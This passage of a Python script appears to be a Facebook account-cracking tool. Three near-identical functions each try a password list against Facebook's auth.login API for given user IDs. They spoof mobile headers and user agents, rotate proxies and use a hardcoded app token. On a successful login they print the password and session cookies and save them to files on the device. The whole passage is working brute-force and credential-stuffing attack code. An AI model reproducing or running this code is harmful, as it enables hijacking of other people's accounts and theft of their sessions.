    menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def _method_A_(uid,passlist,user):
    global loop,oks,cps
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;91mCP-:{len(cps)}\x1b[1;97m]");sys.stdout.flush()
    sys.stdout.flush()
    Session = requests.Session()
    try:
        for pas in passlist:
            ua = ug1()
            ua = windows()
            headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            }
            params = {
            'format': 'json',
            'email': str(uid),
            'password': str(pas),
            'credentials_type': 'device_based_login_password',
            'generate_session_cookies': '1',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
            'method': 'GET',
            'locale': 'en_PH',
            'client_country_code': 'en_PH',
            'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'fb_api_req_friendly_name': 'authenticate',
            'cpl': 'true',
            }
            proxy = {'http': 'http://' + random.choice(proxies)} if use_proxy and proxies else None
            rp = Session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers, proxies=proxy).json()
            if 'session_key' in rp or 'Please Confirm Email' in str(rp):
                coki = ";".join(i["name"]+"="+i["value"] for i in rp["session_cookies"])
                print(f'\r\r\x1b[1;97m[\x1b[1;92mERROR-OK💚\x1b[1;97m]\x1b[1;92m '+uid+f' | '+pas+'')
                print(f'\r\r\x1b[1;97m[\x1b[1;92mCOOKIE\x1b[1;97m]\x1b[1;92m '+coki+'')
                linex()
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M1-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def _method_B_(uid,passlist,user):
    global loop,oks,cps
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M2\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;91mCP-:{len(cps)}\x1b[1;97m]");sys.stdout.flush()
    sys.stdout.flush()
    Session = requests.Session()
    try:
        for pas in passlist:
            ua = Samsung()
            ua = ug2()
            headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            }
            params = {
            'format': 'json',
            'email': str(uid),
            'password': str(pas),
            'credentials_type': 'device_based_login_password',
            'generate_session_cookies': '1',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
            'method': 'GET',
            'locale': 'en_PH',
            'client_country_code': 'en_PH',
            'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'fb_api_req_friendly_name': 'authenticate',
            'cpl': 'true',
            }
            proxy = {'http': 'http://' + random.choice(proxies)} if use_proxy and proxies else None
            rp = Session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers, proxies=proxy).json()
            if 'session_key' in rp or 'Please Confirm Email' in str(rp):
                coki = ";".join(i["name"]+"="+i["value"] for i in rp["session_cookies"])
                print(f'\r\r\x1b[1;97m[\x1b[1;92mERROR-OK💚\x1b[1;97m]\x1b[1;92m '+uid+f' | '+pas+'')
                print(f'\r\r\x1b[1;97m[\x1b[1;92mCOOKIE\x1b[1;97m]\x1b[1;92m '+coki+'')
                linex()
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M2-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def _method_C_(uid,passlist,user):
    global loop,oks,cps
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M3\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;91mCP-:{len(cps)}\x1b[1;97m]");sys.stdout.flush()
    sys.stdout.flush()
    Session = requests.Session()
    try:
        for pas in passlist:
            ua = Samsung()
            headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            }
            params = {
            'format': 'json',
            'email': str(uid),
            'password': str(pas),
            'credentials_type': 'device_based_login_password',
            'generate_session_cookies': '1',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
            'method': 'GET',
            'locale': 'en_PH',
            'client_country_code': 'en_PH',
            'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'fb_api_req_friendly_name': 'authenticate',
            'cpl': 'true',
            }
            proxy = {'http': 'http://' + random.choice(proxies)} if use_proxy and proxies else None
            rp = Session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers, proxies=proxy).json()
            if 'session_key' in rp or 'Please Confirm Email' in str(rp):
                coki = ";".join(i["name"]+"="+i["value"] for i in rp["session_cookies"])
                print(f'\r\r\x1b[1;97m[\x1b[1;92mERROR-OK💚\x1b[1;97m]\x1b[1;92m '+uid+f' | '+pas+'')
                print(f'\r\r\x1b[1;97m[\x1b[1;92mCOOKIE\x1b[1;97m]\x1b[1;92m '+coki+'')
                linex()
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M3-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ END ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
if __name__ == "__main__":
    approval()